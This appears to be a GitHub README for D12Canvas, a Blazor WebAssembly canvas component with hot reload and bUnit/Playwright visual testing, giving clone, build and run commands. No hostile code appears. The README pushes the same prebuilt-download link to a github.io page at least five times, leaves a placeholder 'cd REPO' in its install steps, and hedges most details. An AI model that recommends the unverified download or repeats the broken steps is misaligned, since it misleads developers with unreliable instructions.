# D12Canvas - Blazor Canvas Component 2026

> **D12Canvas is a .NET Blazor WebAssembly canvas component for building and validating interactive canvas layouts, with hot reload and automated visual testing support.**

[![Platform](https://img.shields.io/badge/Platform-.NET%20Blazor%20WebAssembly-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cschmidt65/d12canvas-blazor-kit?style=flat-square)](https://github.com/cschmidt65/d12canvas-blazor-kit)

---

<p align="center">
  <a href="https://cschmidt65.github.io/d12canvas-blazor-kit/">
    <img src="https://img.shields.io/badge/Download-D12Canvas%20Latest-brightgreen?style=for-the-badge" alt="Download D12Canvas">
  </a>
</p>

> **[Direct Download - D12Canvas](https://cschmidt65.github.io/d12canvas-blazor-kit/)**

---

[Download Latest Build](https://cschmidt65.github.io/d12canvas-blazor-kit/)

---

## What Is D12Canvas?

D12Canvas ships a canvas-oriented Blazor WebAssembly component on .NET for teams that design interactive surfaces in the browser. You can assemble canvas UIs and then inspect how layout, CSS placement, zoom, and pan behave without leaving a standard Blazor app.

Development and verification sit side by side: hot reload keeps UI edits tight, while bUnit and Playwright cover component state, screenshots, and rendered comparisons as you iterate.

---

## Capabilities

- Hot reload to tighten the Blazor edit loop
- bUnit coverage for component logic and state
- Playwright-driven screenshot-diff visual checks
- Validation of canvas layouts after render
- CSS positioning review for canvas-hosted elements
- Visual checks focused on zoom interaction
- Visual checks focused on pan interaction
- Native fit with Blazor WebAssembly on .NET

---

## Installation

Clone the repo and open it in a .NET-ready environment:

```bash
git clone https://github.com/cschmidt65/d12canvas-blazor-kit.git
cd REPO
```

Restore packages and compile:

```bash
dotnet restore
dotnet build
```

Start the Blazor WebAssembly app with the project defaults:

```bash
dotnet run
```

Prefer a prebuilt package? Use [Download Latest Build](https://cschmidt65.github.io/d12canvas-blazor-kit/) and follow the packaging or deploy notes that ship with that build.

---

## Usage

A practical path through D12Canvas:

1. Drop the component into your .NET Blazor WebAssembly app.
2. Author canvas content and the CSS that positions it.
3. Run the app and inspect layout in the browser.
4. Rely on hot reload while you tune markup or styles.
5. Probe logic and state via bUnit.
6. Capture browser screenshots and diffs with Playwright.
7. Confirm zoom and pan on the layouts your product actually uses.

Common dev commands:

```bash
dotnet build
dotnet run
```

bUnit and Playwright entry points depend on the test projects and scripts in the tree. Read the repo test setup before you run those suites.

---

## Configuration

Wire behavior through component parameters, markup, and the host Blazor configuration. Keep layout and CSS next to the view or stylesheet that owns that surface.

A lightweight project config sketch:

```json
{
  "D12Canvas": {
    "EnableHotReload": true,
    "EnableVisualTesting": true
  }
}
```

Supported keys follow the current source. Treat the sample as a template and match real parameter names in the codebase before you commit it.

---

## Requirements

- A .NET toolchain that matches the solution
- Blazor WebAssembly capability
- A current browser to host the canvas UI
- Playwright if you need screenshot-diff browser tests
- bUnit if you need component logic and state tests
- Disk space for the clone, restored packages, and test outputs

---

## FAQ

### Who should use D12Canvas?

.NET developers shipping canvas UIs on Blazor WebAssembly, especially when layout, styling, state, zoom, or pan need systematic checks.

### Where do I get the newest build?

Grab it from [Download Latest Build](https://cschmidt65.github.io/d12canvas-blazor-kit/) near the top of this README.

### Is hot reload available?

Yes. Hot reload is a first-class feature aimed at faster UI iteration.

### How do I test component state?

Use bUnit against the test layout in this repository and the commands that project documents.

### How do visual diffs work?

Playwright handles browser screenshots and screenshot-diff runs. Check baseline paths and harness details in the repo before comparing results.

### The canvas layout looks wrong. What first?

Verify dimensions, CSS positioning, live browser output, and zoom/pan state, then line the render up against the matching visual test artifacts.

### Where do settings live?

Component parameters stay with the usage site; app-wide values go in normal Blazor config files. Confirm names against current source.

### How do I get support or file a bug?

Open a repository issue with environment info, repro steps, relevant component config, and any test logs that clarify the failure.

---

## Roadmap

Areas that may grow next:

- Wider canvas layout validation cases
- Deeper zoom and pan test coverage
- More shareable visual testing patterns
- Extra Blazor WebAssembly sample apps
- Ongoing polish on hot reload and component test flows

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
